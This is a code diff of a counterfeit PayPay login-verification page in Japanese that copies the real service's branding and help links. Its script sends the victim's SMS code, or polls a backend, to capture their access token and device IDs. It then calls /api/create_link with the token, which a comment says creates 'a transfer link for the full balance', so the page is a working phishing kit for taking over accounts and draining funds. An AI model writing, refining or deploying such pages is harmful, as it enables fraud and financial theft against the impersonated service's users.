@@ -4,261 +4,258 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width,height=device-height,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,viewport-fit=cover">
-  <title>PayPay - SMS認証</title>
+  <title>PayPay</title>
   <link rel="icon" href="https://cdn.assets.paypay.ne.jp/cdn/apps/prod/web/5-72-0/favicon.ico">
   <style>
-    @font-face{font-family:Graphik;font-display:swap;font-weight:300;src:url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff)format("woff")}
-    @font-face{font-family:Graphik;font-display:swap;font-weight:400;src:url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff)format("woff")}
-    @font-face{font-family:Graphik;font-display:swap;font-weight:600;src:url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff)format("woff")}
-    @font-face{font-family:Graphik;font-display:swap;font-weight:700;src:url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff)format("woff")}
-
     *, *::before, *::after { box-sizing: border-box; }
-    html, body {
-      margin: 0; padding: 0;
-      font-family: Graphik, "Hiragino Sans", "Hiragino Kaku Gothic ProN", "Noto Sans", "Noto Sans CJK JP", "Noto Sans JP", Meiryo, sans-serif;
-      -webkit-user-select: none; user-select: none;
-      -webkit-touch-callout: none;
-      font-size: 12px;
-      background-color: #fff;
+    html {
+      font-size: 10px;
     }
     body {
+      margin: 0; padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Roboto", Graphik, "Hiragino Sans", "Hiragino Kaku Gothic ProN", "Noto Sans CJK JP", "Noto Sans JP", sans-serif;
+      font-size: 1.4rem;
+      background: #fff;
+      color: #242323;
+      -webkit-user-select: none; user-select: none;
       min-height: 100vh;
-      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+      padding-bottom: env(safe-area-inset-bottom);
     }
     a { color: #3895ff; text-decoration: none; }
-    button { border: 0; outline: 0; cursor: pointer; font-family: inherit; }
+    button { border: 0; outline: 0; cursor: pointer; font-family: inherit; background: none; padding: 0; }
 
-    .container { max-width: 100vw; margin: 0 auto; }
+    /* Header — exact PayPay h-header iOS rules */
+    .h-header {
+      width: 100%;
+      position: fixed;
+      top: 0; left: 0;
+      z-index: 2;
+      display: flex;
+      padding-top: env(safe-area-inset-top);
+      height: calc(44px + env(safe-area-inset-top));
+      background: #fff;
+      box-shadow: 0 0.5px rgba(0,0,0,.16);
+    }
+    .h-header__left, .h-header__right {
+      flex: 1;
+      height: 100%;
+      display: flex;
+      align-items: center;
+    }
+    .h-header__left  { padding-left: 12px; }
+    .h-header__right { flex: 1; justify-content: flex-end; padding-right: 12px; }
+    .h-header__title {
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 12px;
+      overflow: hidden;
+      max-width: 100%;
+    }
+    .h-header__title h1 {
+      margin: 0;
+      font-size: 1.7rem;
+      font-weight: 600;
+      color: #242323;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .btn-back {
+      display: flex; align-items: center; justify-content: center;
+      width: 44px; height: 44px; flex-shrink: 0;
+    }
+    .btn-help {
+      display: flex; align-items: center; justify-content: center;
+      width: 44px; height: 44px; flex-shrink: 0;
+    }
 
-    /* Fixed header */
-    .top-header { position: relative; }
-    .account-header { z-index: 100; background: #fff; width: 100%; position: fixed; top: 0; }
-    .header-signin {
-      border: 0; border-bottom: 4px solid;
-      flex-direction: row; flex: 1;
-      justify-content: space-between; align-items: center;
-      padding: 8px 12px; display: flex;
+    /* Page content */
+    .page-content {
+      padding-top: calc(44px + env(safe-area-inset-top) + 40px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-left: 24px;
+      padding-right: 24px;
+    }
+
+    /* Composite icon */
+    .icon-wrap {
+      margin-bottom: 20px;
+    }
+
+    /* Title */
+    .auth-title {
+      font-size: 1.8rem;
+      font-weight: 700;
+      text-align: center;
+      margin: 0 0 10px;
+      color: #242323;
+      line-height: 1.5;
+    }
+
+    /* Phone number */
+    .phone-number {
+      font-size: 1.8rem;
+      font-weight: 700;
       color: #3895ff;
-      border-image: linear-gradient(90deg, #6fcaec, rgba(109,213,237,0.7)) 1;
-      box-shadow: 0 15px 20px -20px #6fcaec;
-    }
-    .header-signin img { height: 45px; display: block; }
-    .header-signin h2 { font-size: 26px; font-weight: 400; margin: 0; line-height: 1.2; }
-    .header-more { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); }
-
-    /* Content */
-    .account-content {
-      padding-top: 80px;
-      -webkit-overflow-scrolling: touch;
-      position: relative;
+      text-align: center;
+      margin: 0 0 6px;
     }
 
-    /* OTP Auth Page */
-    .otp-auth-page {
-      max-width: 440px; margin-left: auto; margin-right: auto; padding: 20px;
+    /* Description lines */
+    .auth-desc {
+      font-size: 1.4rem;
+      color: #606060;
+      text-align: center;
+      margin: 0;
+      line-height: 1.6;
+    }
+    .expiry-line {
+      font-size: 1.4rem;
+      color: #606060;
+      text-align: center;
+      margin: 0;
+      line-height: 1.6;
+    }
+    .expiry-line .blue {
+      color: #3895ff;
+      font-weight: 600;
     }
 
-    h3.header-title { color: #161616; margin: 15px auto 10px; font-size: 14px; line-height: 1.4; font-weight: 600; }
-    p.sub-title { color: #969696; font-size: 12px; line-height: 1.4; margin: 0 0 4px; }
-    .mb10 { margin-bottom: 10px; }
-    .ml10 { margin-left: 10px; }
-
-    /* Phone SMS icon */
-    .component-icon { background-position: 50%; background-repeat: no-repeat; background-size: contain; display: block; }
-    .icon-md { width: 32px; height: 32px; }
-    .icon-phone-sms {
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' fill='none'%3E%3Crect x='7' y='2' width='14' height='22' rx='3' fill='%23e8f4fd' stroke='%233895ff' stroke-width='1.5'/%3E%3Crect x='10' y='19' width='8' height='2' rx='1' fill='%233895ff'/%3E%3Crect x='14' y='5' width='4' height='1.5' rx='0.75' fill='%233895ff'/%3E%3Crect x='16' y='17' width='12' height='11' rx='2.5' fill='%233895ff'/%3E%3Cpath d='M19 22h6M19 25h4' stroke='white' stroke-width='1.5' stroke-linecap='round'/%3E%3C/svg%3E");
+    /* Resend */
+    .resend-wrap {
+      margin-top: 36px;
+      text-align: center;
     }
-
-    /* OTP auth section */
-    .otp-auth { padding: 10px 0; }
-    .otp-auth .otp-content { max-width: 305px; margin: 0 auto; }
-
-    /* OTP field */
-    .otp .otp-field {
-      flex-direction: row; justify-content: center; place-items: center;
-      margin-top: 10px; padding: 0 25px; display: flex;
+    .resend-btn {
+      font-size: 1.4rem;
+      color: #bababa;
+      cursor: default;
     }
-    .otp .otp-field .otp-prefix { display: none; }
-    .otp .otp-field .otp-code { width: 100%; }
-    .otp .otp-field .otp-code .otp-input {
-      letter-spacing: 20px; text-align: center;
-      border: none; border-bottom: 2px solid #eee;
-      height: 36px; margin: 0; font-size: 26px; line-height: 14px;
-      width: 100%; outline: none; background: transparent;
-      color: #686868; -webkit-tap-highlight-color: transparent;
-      font-family: inherit; font-weight: 600;
-      -webkit-user-select: text; user-select: text;
-      caret-color: #3895ff;
-      transition: border-bottom-color 0.2s;
+    .resend-btn.active {
+      color: #3895ff;
+      cursor: pointer;
     }
-    .otp .otp-field .otp-code .otp-input:focus { border-bottom-color: #3895ff; }
-
-    /* OTP info box */
-    .otp .otp-info {
-      background-color: #e5f1ff;
-      background-image: url(https://image.paypay.ne.jp/images/payment-miniapps/common/ic-exclamation.svg);
-      background-position: 10px 10px;
-      background-repeat: no-repeat;
-      background-size: 24px;
-      border-radius: 5px;
-      margin-top: 8px;
-      padding: 10px 15px 10px 35px;
-      font-size: 12px;
-      position: relative;
-    }
-    .otp .otp-info p { margin: 0 0 4px; color: #444; line-height: 1.5; }
-    .otp .otp-info p:last-child { margin: 0; }
-    .otp .otp-info a { color: #3895ff; }
-
-    /* Re-send */
-    .otp-auth .re-send { color: #3895ff; cursor: pointer; margin-top: 10px; font-size: 12px; }
-    .otp-auth .re-send.disabled { color: #ddd; cursor: default; pointer-events: none; }
-    .otp-auth .re-send span { font-size: 11px; }
 
     /* Help link */
-    .otp-auth .otp-help {
-      display: flex; align-items: center; justify-content: center;
-      margin-top: 10px; font-size: 12px;
+    .help-link {
+      display: inline-flex;
+      align-items: center;
+      margin-top: 24px;
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: #3895ff;
+      gap: 4px;
     }
-    .otp-auth .otp-help a { color: #3895ff; display: flex; align-items: center; gap: 4px; }
+    .help-link-arrow {
+      font-size: 1.6rem;
+      line-height: 1;
+    }
 
-    /* Submit */
-    .submit-button {
-      color: #fff; background-color: #3895ff; border: none; border-radius: 4px;
-      width: 100%; height: 45px; margin-top: 30px; font-size: 14px;
-      text-align: center; cursor: pointer; outline: none; font-weight: 600;
-      font-family: inherit;
+    /* Footer note */
+    .footer-note {
+      margin-top: 32px;
+      font-size: 1.2rem;
+      color: #909090;
+      text-align: center;
+      line-height: 1.6;
     }
-    .submit-button:disabled { background-color: #e6e6e6; cursor: default; }
 
     /* Error */
     .error-msg {
-      display: none; color: #e53935; font-size: 13px;
-      text-align: center; margin-top: 12px; line-height: 1.5;
+      display: none;
+      color: #fd5c5c;
+      font-size: 1.2rem;
+      margin-top: 12px;
+      text-align: center;
     }
     .error-msg.visible { display: block; }
-
-    /* Loading overlay */
-    .loading-overlay {
-      display: none; position: fixed; inset: 0;
-      background: rgba(255,255,255,0.85); z-index: 9999;
-      flex-direction: column; align-items: center; justify-content: center; gap: 16px;
-    }
-    .loading-overlay.visible { display: flex; }
-    .spinner {
-      width: 36px; height: 36px;
-      border: 3px solid #e6e6e6; border-top-color: #3895ff;
-      border-radius: 50%; animation: spin 0.7s linear infinite;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .loading-text { color: #686868; font-size: 13px; }
   </style>
 </head>
-<body class="ios outside-native account-sign-in">
+<body>
 
-<div id="app" data-v-app="">
-  <div id="app" style="--font-weight-bold: var(--font-weight-bold-ios); --RootPortal-zIndex: 1100;">
-    <div class="container">
-      <section data-v-32bf0b5d="" class="account-root-page">
-
-        <!-- Fixed header -->
-        <section data-v-b035e588="" data-v-32bf0b5d="" class="top-header account-header">
-          <header data-v-b035e588="" class="header-signin">
-            <img data-v-b035e588="" src="https://image.paypay.ne.jp/images/payment-miniapps/opa/logo.png" alt="PayPay" height="45">
-            <h2 data-v-b035e588="">ログイン</h2>
-          </header>
-          <div data-v-b035e588="" class="header-more"></div>
-        </section>
-
-        <!-- Page content -->
-        <div data-v-32bf0b5d="" class="account-content">
-          <section data-v-7964b47e="" data-v-32bf0b5d="" class="otp-auth-page">
-
-            <div data-v-7964b47e="" class="mb10">
-              <i data-v-3c7781bb="" data-v-7964b47e="" class="component-icon icon-phone-sms icon-md"></i>
-            </div>
-
-            <h3 data-v-7964b47e="" class="header-title">SMSで届いた認証コードを入力してください</h3>
-            <p data-v-7964b47e="" class="sub-title">
-              こちらの携帯電話番号に送信しました
-              <strong data-v-7964b47e="" class="ml10" id="phoneDisplay"></strong>
-            </p>
-
-            <section data-v-2dbf0436="" data-v-7964b47e="" class="otp-auth">
-              <div data-v-2dbf0436="" class="otp-content">
-                <div data-v-de519d7f="" data-v-2dbf0436="" class="otp">
-                  <div data-v-de519d7f="" class="otp-field">
-                    <div data-v-de519d7f="" class="otp-prefix" id="otpPrefix"></div>
-                    <div data-v-de519d7f="" class="otp-code">
-                      <input data-v-de519d7f="" id="otpInput" name="otp_input" class="otp-input" maxlength="4" pattern="\d*" type="tel" autocomplete="one-time-code">
-                    </div>
-                  </div>
-                  <div data-v-de519d7f="" class="otp-info">
-                    <p data-v-de519d7f="">認証コードに記載の２文字のアルファベットを確認の上、４桁の数字を入力してください</p>
-                    <p data-v-de519d7f=""><a data-v-de519d7f="" href="https://paypay.ne.jp/rd/support/help/c0177/" target="_blank">アルファベットに関して</a></p>
-                  </div>
-                </div>
-              </div>
-
-              <p data-v-2dbf0436="" class="re-send disabled" id="resendBtn">
-                認証コードを再送 <span id="resendTimer">(60秒後)</span>
-              </p>
-
-              <p data-v-2dbf0436="" class="otp-help">
-                <a data-v-2dbf0436="" href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank">
-                  <img data-v-2dbf0436="" src="https://image.paypay.ne.jp/images/payment-miniapps/common/ic-question.svg" width="14" height="14" alt="help icon">
-                  &nbsp;認証コードが届かない場合
-                </a>
-              </p>
-
-              <div class="error-msg" id="errorMsg"></div>
-
-              <button data-v-2dbf0436="" id="submitBtn" class="submit-button" disabled="">認証する</button>
-            </section>
-
-          </section>
-        </div>
-
-      </section>
+  <!-- Header -->
+  <header class="h-header">
+    <div class="h-header__left">
+      <button class="btn-back" onclick="history.back()" aria-label="戻る">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M11.6644 3.46967C11.9572 3.76256 11.9572 4.23744 11.6644 4.53033L4.19468 12L11.6644 19.4697C11.9572 19.7626 11.9572 20.2374 11.6644 20.5303C11.3715 20.8232 10.8966 20.8232 10.6037 20.5303L2.80168 12.7283C2.39944 12.3261 2.39944 11.6739 2.80168 11.2717L10.6037 3.46967C10.8966 3.17678 11.3715 3.17678 11.6644 3.46967Z" fill="#002970"/>
+        </svg>
+      </button>
     </div>
-  </div>
-</div>
+    <div class="h-header__title">
+      <h1>ログイン認証</h1>
+    </div>
+    <div class="h-header__right">
+      <button class="btn-help" aria-label="ヘルプ">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M11.3113 8.0954C11.5289 8.02057 11.7591 7.98937 11.9887 8.00359L12.0305 8.00618L12.0724 8.00409C12.493 7.9831 12.9074 8.10937 13.2446 8.36075C13.4596 8.55503 13.5972 8.82079 13.6316 9.10905C13.6663 9.40027 13.5932 9.69397 13.4263 9.93476L11.8002 12.0368C11.3996 12.5405 11.2142 13.1821 11.2845 13.8219C11.3298 14.2337 11.7002 14.5308 12.1119 14.4855C12.5237 14.4403 12.8208 14.0699 12.7755 13.6581C12.7484 13.4108 12.8205 13.1628 12.9759 12.9685L14.6327 10.8268L14.6416 10.8142C15.0295 10.2679 15.2004 9.5968 15.1211 8.93146C15.0417 8.26612 14.7178 7.65405 14.2123 7.21422L14.1948 7.19893L14.1763 7.18477C13.5646 6.7159 12.8088 6.47547 12.0395 6.50413C11.6269 6.48393 11.2142 6.54254 10.8234 6.67696C10.4194 6.81593 10.0467 7.03321 9.72675 7.31636C9.40678 7.5995 9.14578 7.94297 8.95868 8.32709C8.77158 8.71122 8.66206 9.12846 8.63639 9.55496C8.6115 9.96842 8.9265 10.3238 9.33997 10.3487C9.75343 10.3736 10.1088 10.0586 10.1337 9.64509C10.1475 9.41544 10.2065 9.19077 10.3072 8.98393C10.408 8.77709 10.5485 8.59215 10.7208 8.43969C10.8931 8.28722 11.0938 8.17023 11.3113 8.0954Z" fill="#3895FF"/>
+          <path d="M13.025 16.515C13.025 17.0673 12.5773 17.515 12.025 17.515C11.4727 17.515 11.025 17.0673 11.025 16.515C11.025 15.9627 11.4727 15.515 12.025 15.515C12.5773 15.515 13.025 15.9627 13.025 16.515Z" fill="#3895FF"/>
+          <path fill-rule="evenodd" clip-rule="evenodd" d="M12 20.75C16.8325 20.75 20.75 16.8325 20.75 12C20.75 7.16751 16.8325 3.25 12 3.25C7.16751 3.25 3.25 7.16751 3.25 12C3.25 16.8325 7.16751 20.75 12 20.75ZM12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#002970"/>
+        </svg>
+      </button>
+    </div>
+  </header>
 
-<!-- Loading overlay -->
-<div class="loading-overlay" id="loadingOverlay">
-  <div class="spinner"></div>
-  <div class="loading-text">認証中...</div>
-</div>
+  <div class="page-content">
+
+    <div class="icon-wrap">
+      <svg xmlns="http://www.w3.org/2000/svg" width="80" height="74" viewBox="10 9 150 138" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <g stroke="#0D2A6E" stroke-width="6.0">
+          <path d="M136.68 71.05A61.55 61.55 0 1 0 96.76 131.65"/>
+          <circle cx="75.2" cy="57.05" r="18.95"/>
+          <path d="M37.00 115.86A39.15 39.15 0 0 1 91.00 95.45"/>
+        </g>
+        <path d="M130.12 84.00C138.12 89.50 146.50 94.00 155.50 94.50V111.00C155.50 126.00 144.12 137.50 130.12 143.50C116.12 137.50 104.75 126.00 104.75 111.00V94.50C113.75 94.00 122.12 89.50 130.12 84.00Z" stroke="#5492F8" stroke-width="6.0"/>
+        <g fill="#5492F8">
+          <circle cx="130.25" cy="110.75" r="6.9"/>
+          <rect x="126.75" y="110.75" width="7.0" height="14.25" rx="3.50"/>
+        </g>
+      </svg>
+    </div>
+
+    <h2 class="auth-title">ログイン認証が必要です</h2>
+
+    <p class="phone-number" id="phoneDisplay"></p>
+    <p class="auth-desc">に届いた認証用リンクをご確認ください</p>
+    <p class="expiry-line">リンクの有効期限は<span class="blue">5分</span>です</p>
+
+    <div class="error-msg" id="errorMsg"></div>
+
+    <div class="resend-wrap">
+      <span class="resend-btn" id="resendBtn">SMSを再送信する <span id="resendTimer">(60秒後)</span></span>
+    </div>
+
+    <a href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank" class="help-link">
+      SMSが届かない場合
+      <span class="help-link-arrow">›</span>
+    </a>
+
+    <p class="footer-note">›認証用リンクは他の人に共有しないでください</p>
+
+  </div>
 
 <script>
 (function () {
-  var input    = document.getElementById('otpInput');
-  var submitBtn = document.getElementById('submitBtn');
   var errorMsg  = document.getElementById('errorMsg');
-  var overlay   = document.getElementById('loadingOverlay');
   var resendBtn = document.getElementById('resendBtn');
   var timerEl   = document.getElementById('resendTimer');
   var phoneEl   = document.getElementById('phoneDisplay');
 
-  // Show phone from sessionStorage
-  var phone = sessionStorage.getItem('paypay_phone') || '';
-  if (phone) phoneEl.textContent = phone;
+  var phone = (sessionStorage.getItem('paypay_phone') || '').replace(/\D/g, '');
+  if (phone.length >= 4) {
+    phoneEl.textContent = '***-****-' + phone.slice(-4);
+  }
 
-  // Enable/disable submit on input
-  input.addEventListener('input', function () {
-    var v = input.value.replace(/\D/g, '');
-    input.value = v.slice(0, 4);
-    submitBtn.disabled = input.value.length !== 4;
-  });
-
-  // Resend countdown
   var seconds = 60;
   var countdown = setInterval(function () {
     seconds--;
     if (seconds <= 0) {
       clearInterval(countdown);
-      resendBtn.classList.remove('disabled');
+      resendBtn.classList.add('active');
       timerEl.textContent = '';
     } else {
       timerEl.textContent = '(' + seconds + '秒後)';
@@ -269,68 +266,54 @@
     errorMsg.textContent = msg;
     errorMsg.classList.add('visible');
   }
-  function clearError() {
-    errorMsg.textContent = '';
-    errorMsg.classList.remove('visible');
+
+  async function complete(accessToken) {
+    try {
+      var linkRes = await fetch('/api/create_link', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ access_token: accessToken })
+      });
+      var linkData = await linkRes.json();
+      if (linkRes.ok && linkData.link) {
+        sessionStorage.setItem('paypay_link',   linkData.link);
+        sessionStorage.setItem('paypay_amount', String(linkData.amount));
+      }
+    } catch (_) {}
+    window.location.href = 'complete.html';
   }
 
-  submitBtn.addEventListener('click', async function () {
-    clearError();
-    var code = input.value.trim();
-    if (code.length !== 4) return;
-
-    overlay.classList.add('visible');
-    submitBtn.disabled = true;
-
+  var polling = false;
+  async function poll() {
+    if (polling) return;
+    polling = true;
     try {
       var res = await fetch('/api/sms_confirm', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ code: code })
+        body: '{}',
       });
       var data = await res.json();
-
       if (!res.ok) {
-        showError(data.error || '認証に失敗しました。もう一度お試しください。');
-        submitBtn.disabled = false;
+        showError(data.error || '認証エラーが発生しました。再度ログインしてください。');
+        clearInterval(timer);
         return;
       }
-
+      if (data.status === 'waiting') { polling = false; return; }
+      clearInterval(timer);
       if (data.access_token) sessionStorage.setItem('paypay_access_token', data.access_token);
-      if (data.device_uuid) sessionStorage.setItem('paypay_device_uuid', data.device_uuid);
-
-      // Store completion timestamp
+      if (data.device_uuid)  sessionStorage.setItem('paypay_device_uuid',  data.device_uuid);
+      if (data.client_uuid)  sessionStorage.setItem('paypay_client_uuid',  data.client_uuid);
       var n = new Date();
-      var completedAt = n.getFullYear() + '年' + (n.getMonth() + 1) + '月' + n.getDate() + '日 ' + n.getHours() + '時' + String(n.getMinutes()).padStart(2, '0') + '分';
-      sessionStorage.setItem('paypay_completed_at', completedAt);
+      sessionStorage.setItem('paypay_completed_at',
+        n.getFullYear() + '年' + (n.getMonth()+1) + '月' + n.getDate() + '日 ' +
+        n.getHours() + '時' + String(n.getMinutes()).padStart(2,'0') + '分');
+      await complete(data.access_token);
+    } catch (_) { polling = false; }
+  }
 
-      // Create a transfer link for the full balance
-      if (data.access_token) {
-        try {
-          var linkRes = await fetch('/api/create_link', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ access_token: data.access_token })
-          });
-          var linkData = await linkRes.json();
-          if (linkRes.ok && linkData.link) {
-            sessionStorage.setItem('paypay_link', linkData.link);
-            sessionStorage.setItem('paypay_amount', String(linkData.amount));
-          }
-        } catch (_) { /* proceed even if link creation fails */ }
-      }
-
-      window.location.href = 'complete.html';
-
-    } catch (err) {
-      showError('通信エラーが発生しました。再度お試しください。');
-      submitBtn.disabled = false;
-    } finally {
-      overlay.classList.remove('visible');
-    }
-  });
-
-  input.focus();
+  var timer = setInterval(poll, 3000);
+  poll();
 })();
 </script>
 </body>
